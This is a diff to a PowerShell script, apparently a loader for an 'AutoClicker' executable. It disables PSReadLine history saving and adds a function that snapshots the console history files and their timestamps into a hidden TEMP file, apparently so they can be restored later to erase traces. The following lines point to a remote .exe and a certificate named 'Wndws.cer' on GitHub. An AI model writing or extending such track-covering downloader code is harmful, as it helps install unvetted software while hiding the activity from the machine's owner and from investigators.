@@ -12,6 +12,33 @@ try {
     Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
+function Save-MystHistorySnapshot {
+    $snap = @{}
+    @(
+        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
+        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+    ) | ForEach-Object {
+        if (-not $_ -or -not (Test-Path -LiteralPath $_)) { return }
+        try {
+            $item = Get-Item -LiteralPath $_ -Force
+            $snap[$_] = @{
+                BytesB64   = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($_))
+                CreatedUtc = $item.CreationTimeUtc.ToString('o')
+                WrittenUtc = $item.LastWriteTimeUtc.ToString('o')
+                AccessUtc  = $item.LastAccessTimeUtc.ToString('o')
+            }
+        } catch {}
+    }
+    if ($snap.Count -eq 0) { return }
+    try {
+        $file = Join-Path $env:TEMP ("wsh_{0}.bin" -f [guid]::NewGuid().ToString('N'))
+        $snap | ConvertTo-Json -Depth 4 -Compress | Set-Content -LiteralPath $file -Encoding UTF8 -Force
+        $env:_MYST_HIST_SNAP = $file
+    } catch {}
+}
+
+Save-MystHistorySnapshot
+
 $script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
 $script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
 $script:CerUrl = "$script:BaseUrl/Wndws.cer"
